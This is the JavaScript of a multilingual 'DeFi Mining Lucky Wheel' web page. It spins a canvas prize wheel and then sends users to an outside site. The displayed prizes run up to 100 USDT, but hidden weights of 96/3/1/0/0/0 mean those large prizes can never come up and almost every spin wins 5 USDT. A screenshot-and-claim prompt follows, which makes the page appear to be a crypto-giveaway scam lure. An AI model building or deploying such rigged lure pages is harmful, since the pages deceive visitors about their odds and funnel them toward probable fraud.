<!-- 省略上方 HTML 与 CSS 部分不变 -->

<script>
  const langText = {
    zh: {
      title: 'DeFi 挖矿幸运转盘',
      win: p => `🎉 恭喜，您获得 ${p}！`,
      prizes: ["5 USDT", "10 USDT", "20 USDT", "50 USDT", "100 USDT", "谢谢参与"],
      spinText: "转动",
      claim: "领取",
      tip: "请截屏保存中奖结果。"
    },
    en: {
      title: 'DeFi Mining Lucky Wheel',
      win: p => `🎉 Congratulations! You won ${p}!`,
      prizes: ["5 USDT", "10 USDT", "20 USDT", "50 USDT", "100 USDT", "Thank you"],
      spinText: "Spin",
      claim: "Claim",
      tip: "Please take a screenshot of your prize."
    },
    pt: {
      title: 'Roleta da Sorte DeFi',
      win: p => `🎉 Você ganhou ${p}!`,
      prizes: ["5 USDT", "10 USDT", "20 USDT", "50 USDT", "100 USDT", "Obrigado"],
      spinText: "Girar",
      claim: "Receber",
      tip: "Por favor, tire uma captura de tela do seu prêmio."
    },
    ja: {
      title: 'DeFi ラッキールーレット',
      win: p => `🎉 ${p} が当たりました！`,
      prizes: ["5 USDT", "10 USDT", "20 USDT", "50 USDT", "100 USDT", "ありがとう"],
      spinText: "回す",
      claim: "受け取る",
      tip: "当選結果をスクリーンショットで保存してください。"
    }
  };

  let currentLang = 'en';
  let prizes = langText.en.prizes;
  const weights = [96, 3, 1, 0, 0, 0];
  const colors = ["#FF6384", "#36A2EB", "#FFCE56", "#4BC0C0", "#9966FF", "#AAAAAA"];

  function drawWheel() {
    const canvas = document.getElementById("wheelCanvas");
    const ctx = canvas.getContext("2d");
    const dpr = window.devicePixelRatio || 1;
    canvas.width = 720 * dpr;
    canvas.height = 720 * dpr;
    ctx.scale(dpr, dpr);
    const arc = Math.PI * 2 / prizes.length;
    ctx.clearRect(0, 0, 720, 720);
    for (let i = 0; i < prizes.length; i++) {
      ctx.beginPath();
      ctx.fillStyle = colors[i];
      ctx.moveTo(360, 360);
      ctx.arc(360, 360, 360, arc * i, arc * (i + 1));
      ctx.fill();
      ctx.save();
      ctx.translate(360, 360);
      ctx.rotate(arc * (i + 0.5));
      ctx.textAlign = "center";
      ctx.fillStyle = "#fff";
      ctx.font = "bold 26px Rubik";
      ctx.shadowColor = "rgba(0,0,0,0.7)";
      ctx.shadowBlur = 6;
      ctx.fillText(prizes[i], 220, 10);
      ctx.restore();
    }
  }

  function setLang(lang) {
    currentLang = lang;
    prizes = langText[lang].prizes;
    document.getElementById('langModal').style.display = 'none';
    document.getElementById('title').textContent = langText[lang].title;
    document.getElementById('spinText').textContent = langText[lang].spinText;
    document.getElementById('claimBtn').textContent = langText[lang].claim;
    document.getElementById('screenshotTip').textContent = langText[lang].tip;
    localStorage.setItem("lang", lang);
    drawWheel();
  }

  function getWeightedIndex(weights) {
    const total = weights.reduce((a, b) => a + b, 0);
    const rand = Math.random() * total;
    let sum = 0;
    for (let i = 0; i < weights.length; i++) {
      sum += weights[i];
      if (rand < sum) return i;
    }
    return weights.length - 1;
  }

  function spin() {
    const wheel = document.getElementById('wheel');
    const spinBtn = document.getElementById('spinBtn');
    if (spinBtn.disabled) return;

    spinBtn.disabled = true;
    const prizeCount = prizes.length;
    const prizeAngle = 360 / prizeCount;
    const randomIndex = getWeightedIndex(weights);
    const stopAngle = 360 * 5 + (360 - (randomIndex * prizeAngle + prizeAngle / 2));
    wheel.style.transition = 'transform 4s ease-out';
    wheel.style.transform = `rotate(${stopAngle}deg)`;
    setTimeout(() => {
      const prize = prizes[randomIndex];
      showPrize(prize);
    }, 4000);
  }

  function showPrize(prize) {
    const modal = document.getElementById('winModal');
    document.getElementById('winText').textContent = langText[currentLang].win(prize);
    document.getElementById('screenshotTip').textContent = langText[currentLang].tip;
    modal.style.display = 'block';
    modal.classList.add('blink');
    setTimeout(() => modal.classList.remove('blink'), 1500);
  }

  function goToHomepage() {
    const a = document.createElement('a');
    a.href = 'https://hot8881.com';
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
  }

  window.addEventListener('load', () => {
    const savedLang = localStorage.getItem("lang");
    if (savedLang && langText[savedLang]) setLang(savedLang);
  });
</script>
